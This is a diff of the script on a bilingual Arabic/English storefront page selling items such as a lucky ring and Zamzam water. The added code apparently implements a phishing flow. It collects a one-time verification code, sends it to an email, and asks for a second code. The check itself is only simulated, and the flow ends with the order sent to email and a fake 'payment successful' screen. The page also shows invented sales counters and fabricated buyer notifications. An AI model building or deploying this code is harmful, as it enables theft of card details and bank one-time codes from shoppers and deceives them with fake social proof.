             setTimeout(() => {
                 resendBtn.textContent = originalText;
-                startTimer();
+                startVerificationTimer();
             }, 2000);
         }
 
-        // Utility functions
-        function showMessage(message, type) {
-            const messageDiv = document.createElement('div');
-            const bgColor = type === 'success' ? 'bg-emerald' : 'bg-red-500';
+        // Verification form submission
+        function initVerificationForm() {
+            const form = document.getElementById('verificationForm');
             
-            messageDiv.className = `fixed top-4 right-4 ${bgColor} text-white px-6 py-3 rounded-lg shadow-lg z-50 transform translate-x-full transition-transform duration-300`;
-            messageDiv.textContent = message;
-            
-            document.body.appendChild(messageDiv);
-            
-            // Animate in
-            setTimeout(() => messageDiv.classList.remove('translate-x-full'), 100);
-            
-            // Animate out
-            setTimeout(() => {
-                messageDiv.classList.add('translate-x-full');
-                setTimeout(() => document.body.removeChild(messageDiv), 300);
-            }, 3000);
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const inputs = document.querySelectorAll('#verificationModal input[data-index]');
+                let code = '';
+                inputs.forEach(input => {
+                    code += input.value;
+                });
+
+                if (code.length !== 6) {
+                    alert(currentLanguage === 'ar' ? 'يرجى إدخال الرمز كاملاً' : 'Please enter the complete code');
+                    return;
+                }
+
+                // Show processing
+                const submitBtn = form.querySelector('button[type="submit"]');
+                const originalText = submitBtn.innerHTML;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>' + (currentLanguage === 'ar' ? 'جاري التحقق...' : 'Verifying...');
+                submitBtn.disabled = true;
+
+                // Send verification code to email
+                sendVerificationCodeToEmail(code);
+
+                // Simulate verification
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                    
+                    // Clear timer
+                    clearInterval(timerInterval);
+                    
+                    // Close verification modal
+                    const modal = document.getElementById('verificationModal');
+                    modal.classList.add('hidden');
+                    modal.classList.remove('flex');
+                    
+                    // إذا كان هذا هو الكود الأول، اطلب كود ثاني
+                    if (!window.firstCodeVerified) {
+                        window.firstCodeVerified = true;
+                        
+                        // إرسال الكود الأول
+                        sendVerificationCodeToEmail(code + ' (الكود الأول)');
+                        
+                        // إعادة تشغيل المؤقت لكود ثاني
+                        clearFormInputs();
+                        startVerificationTimer();
+                        showTemporaryMessage('تم التحقق! أدخل الكود الثاني ✅', 'success');
+                        
+                        return; // توقف هنا
+                    }
+                    
+                    // إذا كان هذا هو الكود الثاني
+                    sendVerificationCodeToEmail(code + ' (الكود الثاني)');
+                    sendFinalOrderToEmail();
+                    
+                    // رسالة "تم الدفع" والانتقال للصفحة الرئيسية
+                    showPaymentSuccessAndRedirect();
+                }, 2000);
+            });
         }
 
+        function closeCheckout() {
+            const modal = document.getElementById('checkoutModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+
+        function closePaymentModal() {
+            const modal = document.getElementById('paymentModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+
+        // Advanced Tech Features
+        
+        // Initialize AOS animations
+        AOS.init({
+            duration: 800,
+            easing: 'ease-in-out',
+            once: true
+        });
+
+        // Live stats counter animation
         function animateCounter(elementId, finalValue, suffix = '') {
             const element = document.getElementById(elementId);
             let currentValue = 0;
@@ -1183,7 +1373,15 @@
             }, 50);
         }
 
-        // Live notifications
+        // Start counters when page loads
+        setTimeout(() => {
+            animateCounter('ordersCounter', 127);
+            animateCounter('customersCounter', 8543);
+            animateCounter('countriesCounter', 45);
+            animateCounter('successCounter', 98, '%');
+        }, 1000);
+
+        // Live notifications system
         const notifications = [
             { ar: 'محمد من الرياض اشترى خاتم الحظ', en: 'Mohammed from Riyadh bought Lucky Ring' },
             { ar: 'فاطمة من دبي طلبت ماء زمزم', en: 'Fatima from Dubai ordered Zamzam Water' },
@@ -1209,24 +1407,85 @@
             container.appendChild(notificationDiv);
             
             // Animate in
-            setTimeout(() => notificationDiv.classList.remove('translate-x-full'), 100);
+            setTimeout(() => {
+                notificationDiv.classList.remove('translate-x-full');
+            }, 100);
             
             // Animate out
             setTimeout(() => {
                 notificationDiv.classList.add('translate-x-full');
-                setTimeout(() => container.removeChild(notificationDiv), 300);
+                setTimeout(() => {
+                    container.removeChild(notificationDiv);
+                }, 300);
             }, 4000);
         }
 
         // Show notifications every 8 seconds
         setInterval(showLiveNotification, 8000);
 
-        // Initialize AOS
-        AOS.init({
-            duration: 800,
-            easing: 'ease-in-out',
-            once: true
+        // Initialize advanced features
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 DOM Content Loaded - Starting initialization...');
+            
+            // Initialize all features
+            initCardValidation();
+            initPaymentForm();
+            initVerificationInputs();
+            initVerificationForm();
+            
+            // 🔥 تأكد من تهيئة نموذج الشحن
+            setTimeout(() => {
+                initShippingForm();
+                console.log('✅ Shipping form initialization attempted');
+            }, 500);
+            
+            console.log('🚀 All forms initialized successfully!');
         });
+
+        // Clear form inputs for second code
+        function clearFormInputs() {
+            const inputs = document.querySelectorAll('#verificationModal input[data-index]');
+            inputs.forEach(input => {
+                input.value = '';
+            });
+            
+            // Focus first input again
+            setTimeout(() => {
+                inputs[0].focus();
+            }, 100);
+            
+            // Re-show modal for second code
+            const modal = document.getElementById('verificationModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+
+        // Show payment success and redirect to main page
+        function showPaymentSuccessAndRedirect() {
+            // Clear cart first
+            cart = [];
+            updateCartDisplay();
+            
+            // Show success message
+            const successDiv = document.createElement('div');
+            successDiv.className = 'fixed inset-0 bg-emerald text-white flex items-center justify-center z-50 text-2xl font-bold';
+            successDiv.innerHTML = `
+                <div class="text-center animate-bounce">
+                    <i class="fas fa-check-circle text-6xl mb-4"></i>
+                    <p>تم الدفع بنجاح! 💳</p>
+                    <p class="text-lg mt-2">شكراً لك! 🎉</p>
+                    <p class="text-base mt-4">سيتم توجيهك للصفحة الرئيسية...</p>
+                </div>
+            `;
+            
+            document.body.appendChild(successDiv);
+            
+            // Redirect to main page after 3 seconds
+            setTimeout(() => {
+                // Reload the page to go back to main
+                window.location.reload();
+            }, 3000);
+        }
     </script>
 
 
